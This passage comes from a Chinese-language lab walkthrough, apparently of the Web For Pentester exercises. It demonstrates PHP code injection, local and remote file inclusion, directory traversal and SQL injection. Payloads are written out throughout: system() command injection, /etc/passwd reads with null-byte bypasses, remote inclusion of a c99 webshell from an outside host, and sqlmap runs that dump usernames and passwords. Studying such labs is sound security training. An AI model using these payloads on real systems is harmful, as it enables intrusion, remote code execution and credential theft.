-<p>代码中使用了usort()函数和create_function()函数。在给某些信息排序的时候，开发者通常用两种方式，一是通过SQL请求来排序，二是利用PHP的usort函数。usort()函数通常和create_function()函数一起使用，用来根据用户控制的输入信息来动态的产生排序函数。如果web应用程序缺少严格的过滤和检验就可能导致代码执行漏洞的产生</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
-<p>2.2 输入url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=phpinfo()</span><br></pre></td></tr></table></figure>
-<p>报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>2.3 更改url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=phpinfo();//</span><br></pre></td></tr></table></figure>
-<p>还是报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
-<p>2.4 更改url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=id);phpinfo();//</span><br></pre></td></tr></table></figure>
-<p>还是报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
-<p>2.5 更改url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=id)&#125;;phpinfo();//</span><br></pre></td></tr></table></figure>
-<p>还是报错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-5.png" alt="2-5"></p>
-<p>2.6 更改url，成功得到PHP信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=id);&#125;phpinfo();//</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-6.png" alt="2-6"></p>
-<p>2.7 获取目标系统信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order=id);&#125;;system(&apos;uname -a&apos;);//</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-7.png" alt="2-7"></p>
-<p>三、Example 3</p>
-<p>3.1 源代码</p>
-<p>代码中使用了preg_replace()函数。在PHP中有一个非常危险的修饰符：preg_replace_eval()函数，这个修饰符会导致在执行替换之前preg_replace函数把新值当做PHP代码来执行（preg_replace_eval()函数在PHP5.0开始被剔除）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
-<p>3.2 由URL可知用的应该是正则表达式</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
-<p>3.3 </p>
-<p>我们知道PHP很大部分关于code injection的漏洞都来自对于PCRE(Perl Compatible Regular Expression)的使用不当。PCRE被用于使用正则表达式，如preg_match和preg_replace。正常情况下，它是安全的，不过当在正则表达式后使用/e时，它允许PHP function添加一个callback</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?new=phpinfo()&amp;pattern=/lamer/e&amp;base=...</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
-<h4 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h4><p>还可以使用system()函数执行任意命令，查看passwd系统文件或者ls命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?new=system(&apos;pwd&apos;)&amp;pattern=/lamer/e&amp;base=...</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-4-1.png" alt="3-4-1"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?new=system(&apos;ls&apos;)&amp;pattern=/lamer/e&amp;base=...</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-4-2.png" alt="3-4-2"></p>
-<p>四、Example 4</p>
-<p>4.1 源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4-1.png" alt="4-1"></p>
-<p>4.2 报错信息</p>
-<p>在URL后面添加一个单引号，从报错信息可知代码中使用了assert()函数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4-2.png" alt="4-2"></p>
-<p>4.3 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=hacker&apos;.phpinfo().&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4-3.png" alt="4-3"></p>
-<hr>
-<h1 id="（五）文件包含"><a href="#（五）文件包含" class="headerlink" title="（五）文件包含"></a>（五）文件包含</h1><h2 id="【原理】-4"><a href="#【原理】-4" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）在很多web应用中，开发者需要在多重页面中通过包含文件来载入基础类或者共享一些模板</p>
-<p>（2）文件包含漏洞是因为在用户控制的变量作为文件名的一部分被传入文件包含函数（PHP中有require、require_once、include or include_once等函数）时没有进行严格的过滤。一旦文件传入的方式存在漏洞，攻击者就可能操纵函数加载自己的代码。文件包含漏洞也可以被用来遍历读取任意文件。但是，如果有任意的代码包含开放的PHP标签，这个文件会被作为PHP代码来执行</p>
-<p>（3）文件包含函数可以允许载入本地资源或者远程资源（比如一个web网站）。如果漏洞存在，他将导致：</p>
-<p>（4）本地文件包含：简称LFI，可以读取和执行本地文件</p>
-<p>（5）远程文件包含：简称RFI，可以获取和执行远程文件</p>
-<p>（6）默认情况下，PHP禁止载入远程文件，关联的配置选项是allow_url_included。在ISO中，这个选项被设置为允许能让你测试RFI漏洞</p>
-<h2 id="【步骤】-4"><a href="#【步骤】-4" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1 源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p>1.2 输入代码</p>
-<p>在URL后随便添加一个特殊字符（比如单引号），会返回一个错误消息，由错误消息可以准确得到几条信息</p>
-<p>一是这个脚本的路径是/var/www/fileincl/example1.php，二是这个函数用了include()，三是include()函数包含的文件是intro.php，且没有多余的东西或有过滤机制</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>1.3 获取passwd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
-<p>1.4 远程包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=http://192.168.1.11/c99.txt</span><br></pre></td></tr></table></figure>
-<p>远程包含c99.txt，此时就直接拿到webshell，可以对网站进行一系列渗透操作</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/1-4.png" alt="1-4"></p>
-<p>二、Example 2 </p>
-<p>2.1 源代码</p>
-<p>由源代码可以看出来，代码中限制了包含的文件后缀为.php。这个例子中，php程序会在提供的文件值添加自己的后缀，也和先前的处理方法雷士，你可以在LFI中用NULL类型值来摆脱后缀带来的困扰。针对RFI，你还可以通过添加&amp;blah= 或者?blah= 绕过后缀问题，这要取决于你遇到的URL形式。在这个示例中，代码模拟的是旧版本的PHP行为。新版本（5.3.4开始）已经纠正了路径处理问题，并且不会受NULL类型值的影响</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
-<p>2.2 输入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p>在本例中想再次获取passwd代码时，已经出错了，可以看到添加了后缀.php</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>2.3 %00</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
-<p>2.4 远程包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pagee=http://192.168.1.111/c99.txt%00</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%94%EF%BC%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
-<hr>
-<h1 id="（六）目录遍历"><a href="#（六）目录遍历" class="headerlink" title="（六）目录遍历"></a>（六）目录遍历</h1><h2 id="【原理】-5"><a href="#【原理】-5" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）目录遍历漏洞是因为web应用对路径部分没有过滤或者编码。在一个遍历漏洞中，可以使用”相同值技术”来测试是否存在问题。举个例子，如果一个参数的路径是/images/photo.jpg。你可以尝试以下这个路径：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/images/./photo.jpg   可以看到同样的页面</span><br><span class="line">/images/../photo.jpg   看懂一个错误页面</span><br><span class="line">/images/../images/photo.jpg   再次看到同样的页面</span><br><span class="line">/images/../IMAGES/photo.jpg   出现一个一个错误（视文件系统而定）或者发生一些古怪的事情</span><br></pre></td></tr></table></figure>
-<p>（2）如果没看到image这个路径参数，这个合法的路径直接是photo.jpg，你需要找出它的父目录是什么</p>
-<p>（3）在测试中，你可以尝试检索其他文件。在Linux/Unix中最常用的测试文件是/etc/passwd。你可以这样尝试：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">images/../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p>（4）如果你能看到passwd文件的内容，说明web应用是存在漏洞的。这个方法的好处是你不用知道需要放几个<strong>../</strong>，如果你放了很多一样能奏效</p>
-<p>（5）另一件有趣的事情是，如果在windows下你有个目录遍历漏洞，你可以打开test/../../../file.txt这样的路径，即使test这个目录不存在。但在linux就行不通。当遇到代码结合用户输入的数据来创建文件名的时候这是很有用的漏洞。举个例子，下面的php代码时设计为添加id变量来创建文件名的（比如example1.txt）。在Linux下，如果不存在以example_开头的目录，就无法利用这个漏洞，然而在windows下，即使不存在这样的目录，也能成功利用这个漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &quot;/var/files/example_&quot;.$_GET[&apos;id&apos;]&quot;.&quot;txt&quot;；</span><br></pre></td></tr></table></figure>
-<h2 id="【步骤】-5"><a href="#【步骤】-5" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1 源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-1-2.png" alt="1-1-2"></p>
-<p>1.2 输入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>查看源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/1-2-2.png" alt="1-2-2"></p>
-<p>二、Example 2</p>
-<p>2.1 源代码</p>
-<p>这个代码加上了简单的路径检查，直接输入路径是看不到东西，但是可以绕过去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-1-2.png" alt="2-1-2"></p>
-<p>2.2 输入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p>返回一片空白</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>2.3 修改绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/www/files/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
-<p>三、Example 3</p>
-<p>3.1 源代码</p>
-<p>在这个代码中，当你尝试遍历目录时，服务端代码会在你的代码后面添加自己的后缀。这时候用NULL字符（url编码为%00）很容易绕过去。用空值摆脱服务器端添加的后缀通常是绕过方法，这在perl和旧版本的PHP能达到很好的效果。PHP从5.3.4开始解决了这个安全漏洞</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/3-1-2.png" alt="3-1-2"></p>
-<p>3.2 输入代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<p>同样得不到任何东西</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
-<p>3.3 修改一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AD%EF%BC%89%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
-<hr>
-<h1 id="（七）SQL注入"><a href="#（七）SQL注入" class="headerlink" title="（七）SQL注入"></a>（七）SQL注入</h1><h2 id="【原理】-6"><a href="#【原理】-6" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）SQL注入是最常见的web漏洞之一。这里所有的SQL注入漏洞练习都是用Mysql当做数据库。SQL注入是由于程序做SQL查询的时候缺乏编码或者转义用户的输入造成的。由于SQL查询语句信息添加方式不同，需要用不同的语句来完成SQL注入，如使用引号（单引号或者双引号）、用反引号，以及直接添加值</p>
-<p>（2）通过9个SQL注入实例的练习，可以学到：</p>
-<ul>
-<li>SQL躲避filter的各种方法，如使用HTML Encode、/<em> </em>/注释、正则表达式、order by等方法进行filter</li>
-<li>insert、update、delete statement的注入方式</li>
-<li>Prepared Statement的防注入</li>
-</ul>
-<h2 id="【步骤】-6"><a href="#【步骤】-6" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1 源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
-<p>1.2 环境内容</p>
-<p>可以看到参数是一个字符串root，并且看到表中有一行数据</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
-<p>1.3 尝试</p>
-<p>在不知道服务器端代码的情况下，为了了解，我们随便输入一些参数进行测试</p>
-<p>（1）在root参数后面添加一些多余的字符，结果返回的表中没有任何数据，可以猜测服务器端用到了我们提交的数据，并且对数据做了某些匹配，因为没有匹配的数据，所有没有数据返回</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root123</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-1.png" alt="1-3-1"></p>
-<p>（2）在root后面添加空格，却可以返回数据，因为Mysql默认情况下作比较操作的时候会忽略掉空格（+号代表空格）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root+++</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-2.png" alt="1-3-2"></p>
-<p>（3）添加双引号，同样没有数据返回</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-3.png" alt="1-3-3"></p>
-<p>（4）添加单引号时，整个表格直接是消失了，说明我们可能破坏了一些东西。由测试，我们可以推断出SQL查询语句有可能是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;[INPUT]&apos;;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-3-4.png" alt="1-3-4"></p>
-<p>1.4 对猜测结果测试</p>
-<p>（1）加上#号（url编码为%23），原先的查询语句中单引号会被#号注释掉</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos;%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-4-1.png" alt="1-4-1"></p>
-<p>（2）加上and 1=1，得到和root一样的数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos; and 1=1 %23</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-4-2.png" alt="1-4-2"></p>
-<p>（3）加上and 1=2，没有数据可以放回</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos; and 1=2</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-4-3.png" alt="1-4-3"></p>
-<p>1.5  利用注入点进行注入</p>
-<p>既然上面的猜测成立了，那么我们就可以利用注入点进行SQL注入</p>
-<p>（1）利用sqlmap。注意：命令行中切换到sqlmap的目录下在执行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://...?name=root&quot;</span><br></pre></td></tr></table></figure>
-<p>这条命令可以获得目标操作系统的：操作系统版本、服务器使用的PHP和Apache版本、数据库版本</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-1.png" alt="1-5-1"></p>
-<p>（2）查看拥有的数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://...?name=root&quot; --dbs</span><br></pre></td></tr></table></figure>
-<p>可以获得目标所拥有的所有数据库。ps：因为information_schema是默认存在的，所以我们可以确定当前使用的数据库就是另外一个：exercises，不用再通过–current-db来获取当前数据库</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-2.png" alt="1-5-2"></p>
-<p>（3）获取某个数据库拥有的表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://...?name=root&quot; --tables -D &quot;exercises&quot;</span><br></pre></td></tr></table></figure>
-<p>从结果可以看出来，数据库中只有一个users表</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-3.png" alt="1-5-3"></p>
-<p>（4）获取某个表的所有字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://...?name=root&quot; --columns -D &quot;exercises&quot;</span><br></pre></td></tr></table></figure>
-<p>因为只有一张表，所有可以直接不用-T来指定哪个表，不然要使用-T</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%83%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-5-4.png" alt="1-5-4"></p>
-<p>（5）获取某个字段的指定内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://...?name=root&quot; --dump -C &quot;name.passwd&quot; -D &quot;exercises&quot;</span><br></pre></td></tr></table></figure>
-<p>使用–dump获取由-C执行的字段值，结果得到5个账号的用户名和密码</p>
